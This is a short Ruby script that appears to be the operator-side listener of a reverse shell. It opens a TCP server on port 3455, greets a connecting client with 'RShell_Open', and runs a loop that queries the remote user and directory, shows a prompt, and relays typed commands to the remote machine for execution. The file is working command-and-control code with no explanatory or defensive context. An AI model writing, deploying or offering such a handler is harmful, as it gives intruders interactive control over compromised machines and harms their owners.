require "socket"

host = "0.0.0.0"
port = 3455

server = TCPServer.new(host, port)
puts "Listening on #{host}:#{port.to_s}"
thr = Thread.new do
	client = server.accept
	client.puts "RShell_Open"
	currentDirCommand = client.gets
	sock_domain, remote_port, remote_hostname, remote_ip = client.peeraddr
	loop do
		client.puts "whoami"
		whoami = client.gets.gsub("\\NEWLINE", "\n").chomp.chomp
		client.puts currentDirCommand
		cd = client.gets.gsub("\\NEWLINE", "\n").chomp.chomp
		print "#{whoami}@#{remote_ip}:#{cd}> "
		cmd = gets.chomp
		client.puts cmd
		if cmd.downcase == "exit"
			exit
		end
		puts client.gets.gsub("\\NEWLINE", "\n").chomp
	end
end

thr.join
